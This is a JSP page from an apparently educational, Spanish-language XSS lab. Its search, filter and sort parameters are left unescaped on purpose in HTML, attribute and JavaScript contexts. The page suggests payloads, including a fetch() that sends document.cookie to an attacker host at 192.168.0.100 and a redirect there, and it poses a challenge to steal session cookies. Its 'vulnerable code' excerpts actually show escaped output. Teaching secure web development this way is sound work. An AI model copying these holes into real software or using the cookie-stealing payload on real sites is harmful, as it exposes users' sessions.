<%-- 
    Document   : results
    Created on : Oct 14, 2025, 5:50:59 PM
    Author     : jose
--%>

<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <title>Resultados - XSS Lab</title>
    <style>
        body { font-family: Arial; margin: 40px; }
        .tab { overflow: hidden; border: 1px solid #ccc; background-color: #f1f1f1; }
        .tab button { background-color: inherit; float: left; border: none; outline: none; 
                     cursor: pointer; padding: 14px 16px; transition: 0.3s; }
        .tab button:hover { background-color: #ddd; }
        .tab button.active { background-color: #ccc; }
        .tabcontent { display: none; padding: 6px 12px; border: 1px solid #ccc; border-top: none; }
        .vulnerable { background: #f8d7da; padding: 10px; margin: 5px 0; }
        .instructions { background: #e7f3ff; padding: 15px; margin: 10px 0; border-left: 4px solid #007bff; }
        .exercise { background: #fff3cd; padding: 10px; margin: 10px 0; border: 1px dashed #ffc107; }
        code { background: #eee; padding: 2px 5px; border-radius: 3px; }
        .success { background: #d4edda; padding: 10px; margin: 5px 0; }
        .code-analysis { background: #f8f9fa; padding: 10px; margin: 10px 0; border: 1px solid #dee2e6; }
    </style>
</head>
<body>
    <h1>📊 Resultados Avanzados - Múltiples Vectores XSS</h1>

    <div class="instructions">
        <h3>🎯 OBJETIVO DE ESTA PÁGINA</h3>
        <p><strong>Aprender a identificar y explotar XSS en diferentes contextos dentro de una misma aplicación.</strong></p>
        <p>Esta página simula un panel de resultados con múltiples funcionalidades, cada una con su propia vulnerabilidad.</p>
    </div>

    <div class="tab">
        <button class="tablinks" onclick="openTab(event, 'Search')">🔍 Búsqueda</button>
        <button class="tablinks" onclick="openTab(event, 'Filter')">⚡ Filtros</button>
        <button class="tablinks" onclick="openTab(event, 'Sort')">📈 Ordenar</button>
        <button class="tablinks" onclick="openTab(event, 'Instructions')">📚 Instrucciones Completas</button>
    </div>

    <!-- TAB 1: BÚSQUEDA -->
    <div id="Search" class="tabcontent">
        <h3>🔍 Módulo de Búsqueda</h3>
        
        <div class="vulnerable">
            <strong>VULNERABILIDAD:</strong> Parámetro "search" se refleja directamente en HTML
        </div>

        <div class="exercise">
            <h4>📝 EJERCICIO - Búsqueda Básica</h4>
            <p><strong>Objetivo:</strong> Ejecutar XSS a través del parámetro "search"</p>
            <p><strong>Parámetro:</strong> <code>search</code></p>
            <p><strong>Contexto:</strong> HTML directo</p>
            
            <form>
                <input type="text" name="search" placeholder="Buscar productos..." 
                       value="<%= request.getParameter("search") != null ? request.getParameter("search") : "" %>">
                <button type="submit">Buscar</button>
            </form>

            <div class="instructions">
                <strong>💡 CÓMO PROBAR:</strong>
                <ol>
                    <li>Escribe un payload XSS en el campo de búsqueda</li>
                    <li>Haz click en "Buscar"</li>
                    <li>El payload debería ejecutarse inmediatamente</li>
                </ol>
                <strong>🎯 PAYLOADS SUGERIDOS:</strong>
                <ul>
                    <li><code>&lt;script&gt;alert('Búsqueda XSS')&lt;/script&gt;</code></li>
                    <li><code>&lt;img src=x onerror=alert(1)&gt;</code></li>
                </ul>
            </div>
        </div>

        <%
        String search = request.getParameter("search");
        if (search != null) {
        %>
            <div class="success">
                <h4>✅ Resultados de Búsqueda</h4>
                <p>Buscando: <strong><%= search %></strong></p>
                <p>Se encontraron 5 productos relacionados.</p>
                
                <div class="code-analysis">
                    <strong>ANÁLISIS DEL CÓDIGO VULNERABLE:</strong><br>
                    <code>
                    &lt;p&gt;Buscando: &lt;strong&gt;<%= 
                    search.replace("&", "&amp;")
                          .replace("<", "&lt;")
                          .replace(">", "&gt;")
                          .replace("\"", "&quot;") 
                    %>&lt;/strong&gt;&lt;/p&gt;
                    </code>
                    <p><strong>Problema:</strong> El input del usuario se inserta directamente sin escapado HTML.</p>
                </div>
            </div>
        <%
        }
        %>
    </div>

    <!-- TAB 2: FILTROS -->
    <div id="Filter" class="tabcontent">
        <h3>⚡ Módulo de Filtros</h3>
        
        <div class="vulnerable">
            <strong>VULNERABILIDAD:</strong> Parámetro "filter" se usa en atributos HTML
        </div>

        <div class="exercise">
            <h4>📝 EJERCICIO - Filtros Avanzados</h4>
            <p><strong>Objetivo:</strong> Ejecutar XSS a través del parámetro "filter" en contexto de atributo</p>
            <p><strong>Parámetro:</strong> <code>filter</code></p>
            <p><strong>Contexto:</strong> Atributo HTML (value)</p>
            
            <form>
                <input type="text" name="filter" placeholder="Filtrar por categoría..." 
                       value="<%= request.getParameter("filter") != null ? request.getParameter("filter") : "" %>">
                <button type="submit">Filtrar</button>
            </form>

            <div class="instructions">
                <strong>💡 CÓMO PROBAR:</strong>
                <ol>
                    <li>El payload debe "romper" el atributo value e inyectar nuevo código</li>
                    <li>Usa comillas para cerrar el atributo actual</li>
                    <li>Luego inyecta tu código malicioso</li>
                </ol>
                <strong>🎯 PAYLOADS SUGERIDOS:</strong>
                <ul>
                    <li><code>"&gt;&lt;script&gt;alert('Filtro XSS')&lt;/script&gt;</code></li>
                    <li><code>" onmouseover="alert('Hover XSS')</code></li>
                    <li><code>" onclick="alert('Click XSS')</code></li>
                </ul>
            </div>
        </div>

        <%
        String filter = request.getParameter("filter");
        if (filter != null) {
        %>
            <div class="success">
                <h4>✅ Filtro Aplicado</h4>
                <p>Filtrando por categoría: 
                    <select>
                        <option <%= "electronics".equals(filter) ? "selected" : "" %>>Electrónicos</option>
                        <option <%= "books".equals(filter) ? "selected" : "" %>>Libros</option>
                        <option value="<%= filter %>">Categoría Personalizada</option>
                    </select>
                </p>
                
                <div class="code-analysis">
                    <strong>ANÁLISIS DEL CÓDIGO VULNERABLE:</strong><br>
                    <code>
                    &lt;option value="<%= 
                    filter.replace("&", "&amp;")
                          .replace("<", "&lt;")
                          .replace(">", "&gt;")
                          .replace("\"", "&quot;") 
                    %>"&gt;Categoría Personalizada&lt;/option&gt;
                    </code>
                    <p><strong>Problema:</strong> El input del usuario se usa directamente en un atributo HTML sin escapado.</p>
                </div>
            </div>
        <%
        }
        %>
    </div>

    <!-- TAB 3: ORDENAMIENTO -->
    <div id="Sort" class="tabcontent">
        <h3>📈 Módulo de Ordenamiento</h3>
        
        <div class="vulnerable">
            <strong>VULNERABILIDAD:</strong> Parámetro "sort" se usa en contexto JavaScript
        </div>

        <div class="exercise">
            <h4>📝 EJERCICIO - Ordenamiento JavaScript</h4>
            <p><strong>Objetivo:</strong> Ejecutar XSS a través del parámetro "sort" en contexto JavaScript</p>
            <p><strong>Parámetro:</strong> <code>sort</code></p>
            <p><strong>Contexto:</strong> Dentro de comillas en JavaScript</p>
            
            <form>
                <input type="text" name="sort" placeholder="Ordenar por campo..." 
                       value="<%= request.getParameter("sort") != null ? request.getParameter("sort") : "" %>">
                <button type="submit">Ordenar</button>
            </form>

            <div class="instructions">
                <strong>💡 CÓMO PROBAR:</strong>
                <ol>
                    <li>Debes "escapar" de las comillas del string en JavaScript</li>
                    <li>Cierra las comillas actuales con <code>"</code></li>
                    <li>Termina la línea con <code>;</code> y añade tu código</li>
                    <li>Comenta el resto con <code>//</code></li>
                </ol>
                <strong>🎯 PAYLOADS SUGERIDOS:</strong>
                <ul>
                    <li><code>"; alert('Sort XSS'); //</code></li>
                    <li><code>"; fetch('http://192.168.0.100:8080/attackers-app/log.jsp?cookie='+document.cookie); //</code></li>
                    <li><code>"; document.location='http://192.168.0.100:8080/attackers-app'; //</code></li>
                </ul>
            </div>
        </div>

        <%
        String sort = request.getParameter("sort");
        if (sort != null) {
        %>
            <div class="success">
                <h4>✅ Ordenamiento Aplicado</h4>
                <script>
                    var sortBy = "<%= sort %>";
                    document.write('<p>Ordenando resultados por: <strong>' + sortBy + '</strong></p>');
                    document.write('<p>Los resultados han sido reorganizados.</p>');
                </script>
                
                <div class="code-analysis">
                    <strong>ANÁLISIS DEL CÓDIGO VULNERABLE:</strong><br>
                    <code>
                    var sortBy = "<%= 
                    sort.replace("&", "&amp;")
                        .replace("<", "&lt;")
                        .replace(">", "&gt;")
                        .replace("\"", "&quot;")
                        .replace("'", "&#39;") 
                    %>";
                    </code>
                    <p><strong>Problema:</strong> El input del usuario se inserta directamente en un string JavaScript sin escapado adecuado.</p>
                </div>
            </div>
        <%
        }
        %>
    </div>

    <!-- TAB 4: INSTRUCCIONES COMPLETAS -->
    <div id="Instructions" class="tabcontent">
        <h3>📚 Guía Completa del Ejercicio</h3>
        
        <div class="instructions">
            <h4>🎯 OBJETIVO GENERAL</h4>
            <p>Encontrar y explotar <strong>3 vulnerabilidades XSS diferentes</strong> en los distintos módulos:</p>
            <ol>
                <li><strong>Búsqueda:</strong> XSS en contexto HTML</li>
                <li><strong>Filtros:</strong> XSS en contexto de atributo HTML</li>
                <li><strong>Ordenamiento:</strong> XSS en contexto JavaScript</li>
            </ol>
        </div>

        <div class="exercise">
            <h4>📋 CHECKLIST DE ACTIVIDADES</h4>
            
            <h5>✅ Tarea 1: Búsqueda (Fácil)</h5>
            <ul>
                <li>[ ] Identificar el parámetro "search"</li>
                <li>[ ] Probar payload básico: <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></li>
                <li>[ ] Confirmar que se ejecuta en contexto HTML</li>
                <li>[ ] Probar payload alternativo con img tag</li>
            </ul>

            <h5>✅ Tarea 2: Filtros (Intermedio)</h5>
            <ul>
                <li>[ ] Identificar el parámetro "filter"</li>
                <li>[ ] Entender que está en contexto de atributo</li>
                <li>[ ] Probar payload que cierre el atributo: <code>"&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
                <li>[ ] Probar event handlers: <code>" onmouseover="alert(1)</code></li>
            </ul>

            <h5>✅ Tarea 3: Ordenamiento (Avanzado)</h5>
            <ul>
                <li>[ ] Identificar el parámetro "sort"</li>
                <li>[ ] Entender que está dentro de JavaScript</li>
                <li>[ ] Probar escape de string: <code>"; alert(1); //</code></li>
                <li>[ ] Intentar redirección o robo de cookies</li>
            </ul>

            <h5>✅ Tarea 4: Análisis (Experto)</h5>
            <ul>
                <li>[ ] ¿Cuál vulnerabilidad fue más fácil de explotar?</li>
                <li>[ ] ¿Qué contexto requiere payloads más complejos?</li>
                <li>[ ] ¿Cómo prevenir cada tipo de vulnerabilidad?</li>
            </ul>
        </div>

        <div class="instructions">
            <h4>🔍 TÉCNICAS DE IDENTIFICACIÓN</h4>
            <p><strong>Para encontrar parámetros vulnerables:</strong></p>
            <ol>
                <li>Revisa la URL después de usar cada funcionalidad</li>
                <li>Busca parámetros que aparecen en la página</li>
                <li>Prueba valores simples primero (ej: "test123")</li>
                <li>Observa dónde se refleja tu input en la página</li>
                <li>Identifica el contexto (HTML, atributo, JavaScript)</li>
            </ol>

            <p><strong>Para adaptar payloads al contexto:</strong></p>
            <ul>
                <li><strong>HTML:</strong> <code>&lt;script&gt;...&lt;/script&gt;</code></li>
                <li><strong>Atributo:</strong> Cierra comillas e inyecta: <code>"&gt;...&lt;</code></li>
                <li><strong>JavaScript:</strong> Escapa string y comenta: <code>";...;//</code></li>
            </ul>
        </div>

        <div class="success">
            <h4>🏆 RETO ADICIONAL</h4>
            <p><strong>Para estudiantes que terminen rápido:</strong></p>
            <ul>
                <li>¿Puedes crear un payload que robe la cookie de sesión?</li>
                <li>¿Puedes hacer que la página redirija a google.com?</li>
                <li>¿Puedes encontrar una manera de ejecutar XSS sin usar &lt;script&gt; tags?</li>
                <li>¿Puedes combinar múltiples parámetros en un solo ataque?</li>
            </ul>
        </div>
    </div>

    <script>
        function openTab(evt, tabName) {
            var i, tabcontent, tablinks;
            tabcontent = document.getElementsByClassName("tabcontent");
            for (i = 0; i < tabcontent.length; i++) {
                tabcontent[i].style.display = "none";
            }
            tablinks = document.getElementsByClassName("tablinks");
            for (i = 0; i < tablinks.length; i++) {
                tablinks[i].className = tablinks[i].className.replace(" active", "");
            }
            document.getElementById(tabName).style.display = "block";
            evt.currentTarget.className += " active";
        }
        // Abrir la pestaña de Búsqueda por defecto
        document.getElementsByClassName("tablinks")[0].click();
    </script>

    <hr>
    <div class="instructions">
        <h3>📖 RESUMEN DE LO APRENDIDO</h3>
        <p>En esta página practicaste:</p>
        <ul>
            <li><strong>Identificación sistemática</strong> de múltiples vectores XSS</li>
            <li><strong>Adaptación de payloads</strong> a diferentes contextos (HTML, atributo, JavaScript)</li>
            <li><strong>Técnicas de explotación</strong> específicas para cada contexto</li>
            <li><strong>Análisis de código</strong> vulnerable para entender la raíz del problema</li>
        </ul>
        <p><strong>Siguiente paso:</strong> Aplica estas técnicas en aplicaciones reales y aprende a prevenirlas.</p>
    </div>

    <p><a href="index.jsp">← Volver al inicio</a></p>
</body>
</html>